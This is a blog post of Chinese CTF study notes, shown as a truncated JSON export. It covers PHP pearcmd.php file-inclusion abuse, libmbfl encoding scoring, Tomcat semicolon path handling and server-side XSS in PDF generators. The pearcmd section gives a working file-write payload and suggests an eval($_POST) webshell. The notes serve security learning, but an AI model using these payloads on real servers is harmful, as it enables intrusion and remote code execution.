{"title":"笔记","uid":"cfe293c9110123a937624906f872053b","slug":"Notes","date":"2023-02-15T09:34:06.818Z","updated":"2023-10-09T07:57:00.626Z","comments":true,"path":"api/articles/Notes.json","keywords":null,"cover":"/img/21.jpg","content":"<p><code>关键笔记，主要总结比赛中遇到的</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"pearcmd-php的巧妙利用\"><a href=\"#pearcmd-php的巧妙利用\" class=\"headerlink\" title=\"pearcmd.php的巧妙利用\"></a><code>pearcmd.php</code>的巧妙利用</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>来自P神博客</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp\">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p></blockquote>\n<p>就是利用<code>pearcmd.php</code>这个<code>pecl/pear</code>中的文件。</p>\n<p><code>pecl</code>是<code>PHP</code>中用于管理扩展而使用的命令行工具，而<code>pear</code>是<code>pecl</code>依赖的类库。在<code>7.3</code>及以前，<code>pecl/pear</code>是默认安装的；在<code>7.4</code>及以后，需要我们在编译<code>PHP</code>的时候指定<code>--with-pear</code>才会安装。</p>\n<p>不过，在<code>Docker</code>任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p></blockquote>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php</code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>#config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p></blockquote>\n<p>发送数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>/tmp/hello.php</code><br>当然也可以改成<code>/var/html/www</code>，这样就可以直接读取，不用利用文件包含参数进行对<code>/tmp/hello.php</code>读取</p>\n<p>只是放在<code>/tmp</code>下不容易触发防火墙被删除</p></blockquote>\n<p>利用文件包含存在，再包含这个文件，就会显示我们的信息</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>&lt;?=phpinfo()?&gt;</code><br>也可以改写成<br><code>&lt;?=eval($_POST[8]);&gt;</code><br>这样就可以执行更多的命令了</p></blockquote>\n<h1 id=\"libmbfl打分\"><a href=\"#libmbfl打分\" class=\"headerlink\" title=\"libmbfl打分\"></a>libmbfl打分</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>所以实现<code>$charset == BASE64</code>，只要文件内容前面数据让它识别为base64即可</p>\n<p>那么如何让其认为是base64呢？</p>\n<p>这就涉及到<code>libmbfl</code>的打分，<code>libmbfl</code>是<code>mb</code>扩展</p>\n<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>\n<p>我的理解就是类似像<code>checkengine</code>，比如<code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p></blockquote>\n<p>这是打分判断</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>0xFFFF是-1，&gt;&#x3D;0 </p>\n<blockquote>\n<p>0x21是33 33对应!</p>\n<p>0x2F是47 47对应&#x2F;</p>\n<p><code>47&gt;=c&gt;=33</code></p></blockquote>\n<p><code>/</code>打分打的多</p>\n</blockquote>\n<h1 id=\"Tomcat以-一种奇怪的方式进行规范化\"><a href=\"#Tomcat以-一种奇怪的方式进行规范化\" class=\"headerlink\" title=\"Tomcat以;一种奇怪的方式进行规范化\"></a>Tomcat以;一种奇怪的方式进行规范化</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>;</code>后的数据不解析</p>\n<p>即可<code>http://127.0.0.1/index;123.ico</code>，读取时只视为<code>http://127.0.0.1/index</code></p></blockquote>\n<h1 id=\"服务器端XSS【针对于动态PDF】\"><a href=\"#服务器端XSS【针对于动态PDF】\" class=\"headerlink\" title=\"服务器端XSS【针对于动态PDF】\"></a>服务器端XSS【针对于动态PDF】</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdfhttps://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</code></p></blockquote>\n<p>还是从htb的机器学习到的</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>比如，在一些购物网站订单会自动生成一个动态的pdf方便打印作为报销的凭证，</p>\n<p>但是虽然看起像是pdf，但本质还是html网站。才可以实现动态，而其中的数据也是客户端传向服务器生成</p>\n<p>那么如果传向服务器进行动态pdf生成的数据被用户控制，导致最后生成的pdf中的数据返回一些服务器的敏感的数据，就会非常危险</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>如果网页使用用户控制的输入创建 PDF，您可以尝试诱骗创建 PDF 的机器人执行任意 JS 代码。 因此，如果 PDF 